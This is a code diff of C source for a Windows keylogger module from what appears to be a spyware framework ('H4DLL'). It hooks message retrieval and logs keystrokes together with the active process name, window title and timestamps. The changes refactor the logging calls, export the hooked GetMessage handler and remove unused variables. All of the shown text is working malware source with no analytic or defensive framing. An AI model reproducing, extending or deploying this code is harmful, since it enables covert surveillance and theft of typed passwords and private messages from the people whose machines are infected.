@@ -1,3 +1,19 @@
+#define _CRT_SECURE_NO_WARNINGS 1
+
+#include <Windows.h>
+#include <json/JSON.h>
+#include <time.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/HM_IpcModule.h"
+#include "../../H4DLL/HM_InbundleHook.h"
+#include "../../H4DLL/bin_string.h"
+#include "../../H4DLL/LOG.h"
+#include "../../H4DLL/process.h"
+#include "HM_KeyLog.h"
+
 #define PM_SLEEPTIME 20
 #define LOG_BUF_LIMIT 16
 #define WM_BUFKEY (WM_USER + 1)
@@ -17,17 +33,11 @@ typedef struct {
 } key_log_conf_struct;
 
 typedef struct {
-	DWORD msg;
-	DWORD lprm;
-	DWORD wprm;
-} KEY_PARAMS;
-
-typedef struct {
 	COMMONDATA;
 } GetMessageStruct;
 GetMessageStruct GetMessageData;
 
-static BOOL _stdcall PM_GetMessage(DWORD ARG1,
+BOOL _stdcall PM_GetMessage(DWORD ARG1,
 								   DWORD ARG2,
 								   DWORD ARG3,
 								   DWORD ARG4)
@@ -483,7 +493,6 @@ void ParseKey(DWORD message, DWORD lParam, DWORD wParam )
 
 		DWORD dwCount;
 		WCHAR svBuffer[MEDSIZE];
-		WCHAR temp_buff[MEDSIZE];
 
 		// Vede se il focus e' cambiato
 		hFocus = GetForegroundWindow();
@@ -516,10 +525,10 @@ void ParseKey(DWORD message, DWORD lParam, DWORD wParam )
 			struct tm tstamp;
 			DWORD delimiter = ELEM_DELIMITER;
 			GET_TIME(tstamp);
-			tolog.add("\x00\x00", 2);
+			tolog.add((void *)"\x00\x00", 2);
 			tolog.add(&tstamp, sizeof(tstamp));
-			tolog.add(svProcName, wcslen(svProcName)*2+2);
-			tolog.add(svTitle, wcslen(svTitle)*2+2);
+			tolog.add(svProcName);
+			tolog.add(svTitle);
 			tolog.add(&delimiter, sizeof(DWORD));
 			WriteLog((char *)tolog.get_buf(), tolog.get_len());
 
@@ -657,8 +666,6 @@ DWORD __stdcall PM_KeyLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIM
 
 DWORD __stdcall PM_KeyLogStartStop(BOOL bStartFlag, BOOL bReset)
 {
-	DWORD dummy;
-	key_log_conf_struct key_log_conf;
 	
 	// Lo fa per prima cosa, anche se e' gia' in quello stato
 	// Altrimenti quando gli agenti sono in suspended(per la sync) e ricevo una conf
